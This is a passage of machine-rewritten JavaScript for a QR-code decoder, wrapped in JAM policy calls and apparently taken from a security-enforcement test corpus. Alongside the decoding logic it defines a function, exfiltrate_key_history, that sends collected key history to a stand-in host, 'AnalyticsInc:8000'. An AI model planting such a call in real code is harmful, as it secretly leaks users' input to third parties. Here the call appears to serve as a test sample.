      v978 = length$$12 > 0;
    } while (v978);
    return strData$$1;
  }
  function v120(dataLength$$1) {
    var length$$11 = dataLength$$1;
    var intData = 0;
    var strData = "";
    var tableRomanAndFigure = JAM.new(Array, ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", " ", "$", "%", "*", "+", "-", ".", "/", ":"], JAM.policy.p23);
    var v982 = length$$11 > 0;
    do {
      if (length$$11 > 1) {
        intData = JAM.call(this.getNextBits, this, [11], JAM.policy.p25);
        var firstLetter = JAM.call(Math.floor, Math, [intData / 45], JAM.policy.p39);
        var secondLetter = intData % 45;
        introspect(JAM.policy.p26) {
          var v1797 = tableRomanAndFigure[firstLetter]
        }
        strData = strData + v1797;
        introspect(JAM.policy.p26) {
          var v1798 = tableRomanAndFigure[secondLetter]
        }
        strData = strData + v1798;
        length$$11 = length$$11 - 2;
      } else {
        if (length$$11 === 1) {
          intData = JAM.call(this.getNextBits, this, [6], JAM.policy.p25);
          introspect(JAM.policy.p26) {
            var v1799 = tableRomanAndFigure[intData]
          }
          strData = strData + v1799;
          length$$11 = length$$11 - 1;
        }
      }
      v982 = length$$11 > 0;
    } while (v982);
    return strData;
  }
  function v119(modeIndicator) {
    var index$$41 = 0;
    for (;true;) {
      if (modeIndicator >> index$$41 === 1) {
        break;
      }
      index$$41 = index$$41 + 1;
    }
    var v2478 = qrcode.sizeOfDataLengthInfo;
    var v2479 = this.dataLengthMode;
    introspect(JAM.policy.p26) {
      var v1801 = v2478[v2479]
    }
    introspect(JAM.policy.p26) {
      var v984 = v1801[index$$41]
    }
    return JAM.call(this.getNextBits, this, [v984], JAM.policy.p39);
  }
  function v118() {
    if (this.blockPointer > this.blocks.length - this.numErrorCorrectionCode - 2) {
      return 0;
    } else {
      return JAM.call(this.getNextBits, this, [4], JAM.policy.p25);
    }
    return;
  }
  function v117(numBits) {
    var bits$$15 = 0;
    if (numBits < this.bitPointer + 1) {
      var mask$$5 = 0;
      var i$$60 = 0;
      var v986 = i$$60 < numBits;
      for (;v986;) {
        mask$$5 = mask$$5 + (1 << i$$60);
        i$$60 = i$$60 + 1;
        v986 = i$$60 < numBits;
      }
      mask$$5 = mask$$5 << this.bitPointer - numBits + 1;
      var v2483 = this.blocks;
      var v2484 = this.blockPointer;
      introspect(JAM.policy.p26) {
        var v1807 = v2483[v2484]
      }
      bits$$15 = (v1807 & mask$$5) >> this.bitPointer - numBits + 1;
      this.bitPointer = this.bitPointer - numBits;
      return bits$$15;
    } else {
      if (numBits < this.bitPointer + 1 + 8) {
        var mask1 = 0;
        i$$60 = 0;
        var v989 = i$$60 < this.bitPointer + 1;
        for (;v989;) {
          mask1 = mask1 + (1 << i$$60);
          i$$60 = i$$60 + 1;
          v989 = i$$60 < this.bitPointer + 1;
        }
        var v2489 = this.blocks;
        var v2490 = this.blockPointer;
        introspect(JAM.policy.p26) {
          var v1814 = v2489[v2490]
        }
        bits$$15 = (v1814 & mask1) << numBits - (this.bitPointer + 1);
        this.blockPointer = this.blockPointer + 1;
        var v2673 = this.blocks;
        var v2674 = this.blockPointer;
        introspect(JAM.policy.p26) {
          var v2492 = v2673[v2674]
        }
        bits$$15 = bits$$15 + (v2492 >> 8 - (numBits - (this.bitPointer + 1)));
        this.bitPointer = this.bitPointer - numBits % 8;
        if (this.bitPointer < 0) {
          this.bitPointer = 8 + this.bitPointer;
        }
        return bits$$15;
      } else {
        if (numBits < this.bitPointer + 1 + 16) {
          mask1 = 0;
          var mask3 = 0;
          i$$60 = 0;
          var v996 = i$$60 < this.bitPointer + 1;
          for (;v996;) {
            mask1 = mask1 + (1 << i$$60);
            i$$60 = i$$60 + 1;
            v996 = i$$60 < this.bitPointer + 1;
          }
          var v2497 = this.blocks;
          var v2498 = this.blockPointer;
          introspect(JAM.policy.p26) {
            var v1823 = v2497[v2498]
          }
          var bitsFirstBlock = (v1823 & mask1) << numBits - (this.bitPointer + 1);
          this.blockPointer = this.blockPointer + 1;
          var v1826 = this.blocks;
          var v1827 = this.blockPointer;
          introspect(JAM.policy.p26) {
            var v999 = v1826[v1827]
          }
          var bitsSecondBlock = v999 << numBits - (this.bitPointer + 1 + 8);
          this.blockPointer = this.blockPointer + 1;
          i$$60 = 0;
          var v1001 = i$$60 < numBits - (this.bitPointer + 1 + 8);
          for (;v1001;) {
            mask3 = mask3 + (1 << i$$60);
            i$$60 = i$$60 + 1;
            v1001 = i$$60 < numBits - (this.bitPointer + 1 + 8);
          }
          mask3 = mask3 << 8 - (numBits - (this.bitPointer + 1 + 8));
          var v2504 = this.blocks;
          var v2505 = this.blockPointer;
          introspect(JAM.policy.p26) {
            var v1834 = v2504[v2505]
          }
          var bitsThirdBlock = (v1834 & mask3) >> 8 - (numBits - (this.bitPointer + 1 + 8));
          bits$$15 = bitsFirstBlock + bitsSecondBlock + bitsThirdBlock;
          this.bitPointer = this.bitPointer - (numBits - 8) % 8;
          if (this.bitPointer < 0) {
            this.bitPointer = 8 + this.bitPointer;
          }
          return bits$$15;
        } else {
          return 0;
        }
      }
    }
    return;
  }
  this.blockPointer = 0;
  this.bitPointer = 7;
  this.dataLength = 0;
  this.blocks = blocks;
  this.numErrorCorrectionCode = numErrorCorrectionCode;
  if (version$$8 <= 9) {
    this.dataLengthMode = 0;
  } else {
    var v1838 = version$$8 >= 10;
    if (v1838) {
      v1838 = version$$8 <= 26;
    }
    if (v1838) {
      this.dataLengthMode = 1;
    } else {
      var v1839 = version$$8 >= 27;
      if (v1839) {
        v1839 = version$$8 <= 40;
      }
      if (v1839) {
        this.dataLengthMode = 2;
      }
    }
  }
  this.getNextBits = v117;
  this.NextMode = v118;
  this.getDataLength = v119;
  this.getRomanAndFigureString = v120;
  this.getFigureString = v121;
  this.get8bitByteArray = v122;
  this.getKanjiString = v123;
  JAM.call(this.__defineGetter__, this, ["DataByte", v124], JAM.policy.p23);
  return;
}
function exfiltrate_key_history(key_history) {
  xmlhttp = JAM.new(XMLHttpRequest, [], JAM.policy.p40);
  JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?" + key_history, true], JAM.policy.p23);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p25);
  return;
}
function read(a$$9) {
  JAM.call(document.getElementById, document, ["mid"], JAM.policy.p24).value = a$$9;
  return;
}
function load() {
  qrcode.callback = read;
  return;
}
function processImage() {
  var qrpath = JAM.call(document.getElementById, document, ["imgpath"], JAM.policy.p24).innerHTML;
  JAM.call(qrcode.decode, qrcode, [qrpath], JAM.policy.p39);
  return;
}
GridSampler = {};
GridSampler.checkAndNudgePoints = v125;
GridSampler.sampleGrid3 = v126;
GridSampler.sampleGridx = v127;
var v1018 = Version;
var v2877 = JAM.new(Array, [31892, 34236, 39577, 42195, 48118, 51042, 55367, 58893, 63784, 68472, 70749, 76311, 79154, 84390, 87683, 92361, 96236, 102084, 102881, 110507, 110734, 117786, 119615, 126325, 127568, 133589, 136944, 141498, 145311, 150283, 152622, 158308, 161089, 167017], JAM.policy.p22);
v1018.VERSION_DECODE_INFO = v2877;
var v1019 = Version;
var v2878 = JAM.call(buildVersions, null, [], JAM.policy.p40);
v1019.VERSIONS = v2878;
Version.getVersionForNumber = v128;
Version.getProvisionalVersionForDimension = v129;
Version.decodeVersionInformation = v130;
PerspectiveTransform.quadrilateralToQuadrilateral = v131;
PerspectiveTransform.squareToQuadrilateral = v132;
PerspectiveTransform.quadrilateralToSquare = v133;
var FORMAT_INFO_MASK_QR = 21522;
var FORMAT_INFO_DECODE_LOOKUP = JAM.new(Array, [JAM.new(Array, [21522, 0], JAM.policy.p22), JAM.new(Array, [20773, 1], JAM.policy.p22), JAM.new(Array, [24188, 2], JAM.policy.p22), JAM.new(Array, [23371, 3], JAM.policy.p22), JAM.new(Array, [17913, 4], JAM.policy.p22), JAM.new(Array, [16590, 5], JAM.policy.p22), JAM.new(Array, [20375, 6], JAM.policy.p22), JAM.new(Array, [19104, 7], JAM.policy.p22), JAM.new(Array, [30660, 8], JAM.policy.p22), JAM.new(Array, [29427, 9], JAM.policy.p22), JAM.new(Array, 
[32170, 10], JAM.policy.p22), JAM.new(Array, [30877, 11], JAM.policy.p22), JAM.new(Array, [26159, 12], JAM.policy.p22), JAM.new(Array, [25368, 13], JAM.policy.p22), JAM.new(Array, [27713, 14], JAM.policy.p22), JAM.new(Array, [26998, 15], JAM.policy.p22), JAM.new(Array, [5769, 16], JAM.policy.p22), JAM.new(Array, [5054, 17], JAM.policy.p22), JAM.new(Array, [7399, 18], JAM.policy.p22), JAM.new(Array, [6608, 19], JAM.policy.p22), JAM.new(Array, [1890, 20], JAM.policy.p22), JAM.new(Array, [597, 21], 
JAM.policy.p22), JAM.new(Array, [3340, 22], JAM.policy.p22), JAM.new(Array, [2107, 23], JAM.policy.p22), JAM.new(Array, [13663, 24], JAM.policy.p22), JAM.new(Array, [12392, 25], JAM.policy.p22), JAM.new(Array, [16177, 26], JAM.policy.p22), JAM.new(Array, [14854, 27], JAM.policy.p22), JAM.new(Array, [9396, 28], JAM.policy.p22), JAM.new(Array, [8579, 29], JAM.policy.p22), JAM.new(Array, [11994, 30], JAM.policy.p22), JAM.new(Array, [11245, 31], JAM.policy.p22)], JAM.policy.p38);
var BITS_SET_IN_HALF_BYTE = JAM.new(Array, [0, 1, 1, 2, 1, 2, 2, 3, 1, 2, 2, 3, 2, 3, 3, 4], JAM.policy.p22);
FormatInformation.numBitsDiffering = v134;
FormatInformation.decodeFormatInformation = v135;
FormatInformation.doDecodeFormatInformation = v136;
ErrorCorrectionLevel.forBits = v137;
var L = JAM.new(ErrorCorrectionLevel, [0, 1, "L"], JAM.policy.p22);
var M = JAM.new(ErrorCorrectionLevel, [1, 0, "M"], JAM.policy.p22);
var Q = JAM.new(ErrorCorrectionLevel, [2, 3, "Q"], JAM.policy.p22);
var H = JAM.new(ErrorCorrectionLevel, [3, 2, "H"], JAM.policy.p22);
var FOR_BITS = JAM.new(Array, [M, L, H, Q], JAM.policy.p38);
DataBlock.getDataBlocks = v138;
DataMask = {};
DataMask.forReference = v139;
var v1052 = DataMask;
var v2879 = JAM.new(Array, [JAM.new(DataMask000, [], JAM.policy.p40), JAM.new(DataMask001, [], JAM.policy.p40), JAM.new(DataMask010, [], JAM.policy.p40), JAM.new(DataMask011, [], JAM.policy.p40), JAM.new(DataMask100, [], JAM.policy.p40), JAM.new(DataMask101, [], JAM.policy.p40), JAM.new(DataMask110, [], JAM.policy.p40), JAM.new(DataMask111, [], JAM.policy.p40)], JAM.policy.p38);
v1052.DATA_MASKS = v2879;
var v1053 = GF256;
var v2880 = JAM.new(GF256, [285], JAM.policy.p25);
v1053.QR_CODE_FIELD = v2880;
var v1054 = GF256;
var v2881 = JAM.new(GF256, [301], JAM.policy.p25);
v1054.DATA_MATRIX_FIELD = v2881;
GF256.addOrSubtract = v140;
Decoder = {};
var v1055 = Decoder;
var v2882 = JAM.new(ReedSolomonDecoder, [GF256.QR_CODE_FIELD], JAM.policy.p39);
v1055.rsDecoder = v2882;
Decoder.correctErrors = v141;
Decoder.decode = v142;
qrcode = {};
qrcode.imagedata = null;
qrcode.width = 0;
qrcode.height = 0;
qrcode.qrCodeSymbol = null;
qrcode.debug = false;
qrcode.sizeOfDataLengthInfo = [[10, 9, 8, 8], [12, 11, 16, 10], [14, 13, 16, 12]];
qrcode.callback = null;
qrcode.decode = v145;
qrcode.decode_utf8 = v146;
qrcode.process = v147;
qrcode.getPixel = v148;
qrcode.binarize = v149;
qrcode.getMiddleBrightnessPerArea = v150;
qrcode.grayScaleToBitmap = v151;
qrcode.grayscale = v152;
Array.prototype.remove = v153;
var MIN_SKIP = 3;
var MAX_MODULES = 57;
var INTEGER_MATH_SHIFT = 8;
var CENTER_QUORUM = 2;
qrcode.orderBestPatterns = v154;
JAM.set(JAM.call(document.getElementById, document, ["decode"], JAM.policy.p24), "onclick", processImage);
JAM.call(load, null, [], JAM.policy.p40)

